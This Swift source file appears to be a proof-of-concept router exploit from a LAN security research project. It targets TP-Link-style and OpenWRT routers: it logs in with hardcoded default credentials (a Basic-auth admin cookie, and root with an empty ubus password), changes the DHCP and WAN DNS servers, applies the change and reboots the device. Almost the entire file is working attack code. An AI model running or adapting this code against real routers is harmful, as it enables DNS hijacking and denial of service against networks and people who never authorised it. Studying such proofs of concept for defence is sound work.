//
//  RouterEploit.swift
//  PoC-LanShield
//
//  Created by Alex - SEEMOO on 20.12.24.
//

import Foundation
import os
import SwiftUI


class RouterExploit: ObservableObject {
    
    var baseURL: URL
    @Published var log = ""
    
    init(baseURL: URL, log: String = "") {
            self.baseURL = baseURL
            self.log = log
    }
    
    
    func start() async throws {
        await log("Starting")
        await log("Getting session id")
        var sessionID: String?
        while (sessionID == nil) {
            sessionID = await getSessionID()
            await log("Did not get session id, trying again")
        }
        guard let sessionID else {
            return
        }
        await log("Got sesison id \(sessionID)")
        await log("Changing DNS")
        try await changeDNS(dns1: "8.8.8.8", dns2: "1.1.1.1", sessionId: sessionID)
        await log("Changed DNS")
        try await rebootRouter(sessionId: sessionID)
        await log("Rebooting now.")
    }
    
    func log(_ message: String) async {
        await MainActor.run {
            print(message)
            log += message + "\n"
            #if DDE
            sendTextViaUDP("Router exploit update: \(message)")
            #endif
        }
    }
    
    func getSessionID() async -> String? {
        var url = baseURL.appendingPathComponent("userRpm/LoginRpm.htm")
        url.append(queryItems: [URLQueryItem(name: "Save", value: "Save")])
        
        do {
            var request = URLRequest(url: url, cachePolicy: .reloadIgnoringLocalAndRemoteCacheData)
                            request.addValue("http://192.168.1.1/", forHTTPHeaderField: "Referer")
                            request.addValue("Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0", forHTTPHeaderField: "User-Agent")
            request.addValue("Authorization=Basic%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D", forHTTPHeaderField: "Cookie")
            
            print(request.debugDescription)
            let (data, resp) = try await URLSession.shared.data(for: request)
            
            if let string = String(data: data, encoding: .utf8) {
                
                if let sessionID = extractSessionId(from: string) {
                    return sessionID
                }else {
                    os_log(.error, "Session id not found in body:\n \(string)")
                }
            }
            
        }catch {
            print("Failed: \(error)")
        }
        
        return nil
        
    }
    
    func extractSessionId(from responseBody: String) -> String? {
        let sessionIdPattern = #"""
    window\.parent\.location\.href = "http://192\.168\.1\.1/([^/]+)/userRpm/Index\.htm"
    """#
        
        do {
            let regex = try NSRegularExpression(pattern: sessionIdPattern, options: [])
            let range = NSRange(location: 0, length: responseBody.utf16.count)
            
            if let match = regex.firstMatch(in: responseBody, options: [], range: range) {
                if let sessionIdRange = Range(match.range(at: 1), in: responseBody) {
                    return String(responseBody[sessionIdRange])
                }
            }
        } catch {
            print("Invalid regex pattern: \(error.localizedDescription)")
        }
        
        print("Session ID not found in the response.")
        return nil
    }
    
    func changeDNS(dns1: String, dns2: String, sessionId: String) async throws {
        // Construct the URL
        var urlComponents = URLComponents()
        urlComponents.scheme = "http"
        urlComponents.host = "192.168.1.1"
        urlComponents.path = "/\(sessionId)/userRpm/LanDhcpServerRpm.htm"
        urlComponents.queryItems = [
            URLQueryItem(name: "dhcpserver", value: "1"),
            URLQueryItem(name: "ip1", value: "192.168.1.100"),
            URLQueryItem(name: "ip2", value: "192.168.1.199"),
            URLQueryItem(name: "Lease", value: "120"),
            URLQueryItem(name: "gateway", value: "192.168.1.1"),
            URLQueryItem(name: "domain", value: ""),
            URLQueryItem(name: "dnsserver", value: dns1),
            URLQueryItem(name: "dnsserver2", value: dns2),
            URLQueryItem(name: "Save", value: "Save")
        ]
        
        guard let url = urlComponents.url else {
            print("Failed to construct URL")
            return
        }
        
        // Create the request
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
            request.addValue("http://192.168.1.1/\(sessionId)/userRpm/LanDhcpServerRpm.htm", forHTTPHeaderField: "Referer")
        request.addValue("Authorization=Basic%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D", forHTTPHeaderField: "Cookie")
        
        do {
            // Perform the request using URLSession
            let (data, response) = try await URLSession.shared.data(for: request)
            
            // Check the response status code
            if let httpResponse = response as? HTTPURLResponse {
                if httpResponse.statusCode == 200 {
                    print("Response Code: \(httpResponse.statusCode)")
                    if let responseBody = String(data: data, encoding: .utf8) {
                        if responseBody.contains(dns1) && responseBody.contains(dns2) {
                            print("DNS change successful")
                        }else {
                            print("Response Body:\n\(responseBody)")
                            throw RouterError.dnsChangeFailed
                        }
                        
                    }
                } else {
                    print("Request failed: \(httpResponse.statusCode)")
                    throw RouterError.dnsChangeFailed
                }
            }
        } catch {
            // Handle any errors
            print("An error occurred: \(error.localizedDescription)")
            throw RouterError.dnsChangeFailed
        }
    }
    
    
    
    func rebootRouter(sessionId: String) async throws {
        // Base URL and session path
        let baseURL = "http://192.168.1.1"
        let rebootPath = "/\(sessionId)/userRpm/SysRebootRpm.htm?Reboot=Reboot"
        
        // Construct the full URL
        guard let url = URL(string: baseURL + rebootPath) else {
            print("Invalid URL")
            return
        }
        
        // Create a URL request
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        request.addValue("http://192.168.1.1/\(sessionId)/userRpm/LanDhcpServerRpm.htm", forHTTPHeaderField: "Referer")
        request.addValue("Authorization=Basic%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D", forHTTPHeaderField: "Cookie")
        
        // Create a URL session and task
        let session = URLSession.shared
        do {
            let (data, response) = try await session.data(for: request)
            
            if let httpResponse = response as? HTTPURLResponse {
                //                print("Response Code: \(httpResponse.statusCode)")
                if let responseBody = String(data: data, encoding: .utf8) {
                    if responseBody.contains("Restarting...") {
                        print("Rebooting now.")
                    }else {
                        print("Reboot failed.")
                        print("Response Body:\n\(responseBody)")
                    }
                }
            } else {
                print("No valid HTTP response.")
            }
        }catch {
            throw RouterError.rebootFailed
        }
    }
}


class OpenWRTRouterExploit: ObservableObject {
    
    var baseURL: URL
    @Published var log = ""
    
    init(baseURL: URL, log: String = "") {
            self.baseURL = baseURL
            self.log = log
    }
    
    
    func start() async throws {
        await log("Starting")
        await log("Logging in")
        var sessionID: String?
        while (sessionID == nil) {
            sessionID = await getSessionID()
            await log("Did not get session id, trying again")
        }
        guard let sessionID else {
            return
        }
        await log("Got sesison id \(sessionID)")
        await log("Changing DNS")
        try await changeDNS(dns1: "8.8.8.8", dns2: "1.1.1.1", sessionId: sessionID)
        await log("Changed DNS")
        try await applyChanges(sessionId: sessionID)
        await log("Applied changes.")
        try await rebootRouter(sessionId: sessionID)
        await log("Rebooting now.")
    }
    
    func log(_ message: String) async {
        await MainActor.run {
            print(message)
            log += message + "\n"
            #if DDE
            sendTextViaUDP("Router exploit update: \(message)")
            #endif
        }
    }
    
    func getSessionID() async -> String? {
        let jsonBody = #"{ "jsonrpc": "2.0", "id": 1, "method": "call", "params": ["00000000000000000000000000000000", "session", "login", { "username": "root", "password": "" }] }"#
        
        do {
            var request = URLRequest(url: baseURL.appendingPathComponent("ubus"))
            request.httpMethod = "POST"
            request.addValue("application/json", forHTTPHeaderField: "Content-Type")
            request.httpBody = jsonBody.data(using: .utf8)
            
            let (data, response) = try await URLSession.shared.data(for: request)
            
            let responseBody = String(data: data, encoding: .utf8)!
            
            let sessionRegex = /"ubus_rpc_session":\s*"([^"]+)"/
            let match = try sessionRegex.firstMatch(in: responseBody)
            
            guard let sessionId = match?.1 else {
                return nil
            }
            
            return String(sessionId)
            
        }catch {
            return nil
        }
        
    }
    
    func changeDNS(dns1: String, dns2: String, sessionId: String) async throws {
        
        let payload: [[String: Any]] = [
            [
                "jsonrpc": "2.0",
                "id": 60,
                "method": "call",
                "params": [
                    sessionId,
                    "uci",
                    "set",
                    [
                        "config": "dhcp",
                        "section": "wan",
                        "values": [
                            "ignore": "1"
                        ]
                    ]
                ]
            ],
            [
                "jsonrpc": "2.0",
                "id": 61,
                "method": "call",
                "params": [
                    sessionId,
                    "uci",
                    "set",
                    [
                        "config": "network",
                        "section": "wan",
                        "values": [
                            "peerdns": "0",
                            "dns": [dns1,dns2]
                        ]
                    ]
                ]
            ]
        ]
       
        let jsonBody = try JSONSerialization.data(withJSONObject: payload)
        
        var request = URLRequest(url: baseURL.appendingPathComponent("ubus"))
        request.httpMethod = "POST"
        request.addValue("application/json", forHTTPHeaderField: "Content-Type")
        request.httpBody = jsonBody
        
        let (data, response) = try await URLSession.shared.data(for: request)
        
        guard let response = response as? HTTPURLResponse, response.statusCode == 200 else {
            throw RouterError.dnsChangeFailed
        }
    }
    
    
    func applyChanges(sessionId: String) async throws {
        let jsonBody = """
                        { "jsonrpc": "2.0", "id": 1, "method": "call", "params": ["\(sessionId)", "uci", "apply", { "rollback": false }] }
                       """
        var request = URLRequest(url: baseURL.appendingPathComponent("ubus"))
        request.httpMethod = "POST"
        request.addValue("application/json", forHTTPHeaderField: "Content-Type")
        request.httpBody = jsonBody.data(using: .utf8)
        
        let (data, response) = try await URLSession.shared.data(for: request)
        
        guard let response = response as? HTTPURLResponse, response.statusCode == 200 else {
            throw RouterError.applyFailed
        }
        
        
    }
    
    func rebootRouter(sessionId: String) async throws {
        let jsonBody = """
                       { "jsonrpc": "2.0", "id": 1, "method": "call", "params": ["\(sessionId)", "system", "reboot", {}] }
                       """
        var request = URLRequest(url: baseURL.appendingPathComponent("ubus"))
        request.httpMethod = "POST"
        request.addValue("application/json", forHTTPHeaderField: "Content-Type")
        request.httpBody = jsonBody.data(using: .utf8)
        
        let (data, response) = try await URLSession.shared.data(for: request)
        
        guard let response = response as? HTTPURLResponse, response.statusCode == 200 else {
            throw RouterError.applyFailed
        }
        
    }
}

enum RouterError: Error {
    case other(_ message: String)
    case dnsChangeFailed
    case rebootFailed
    case applyFailed
    case sessionIdNotFound
}

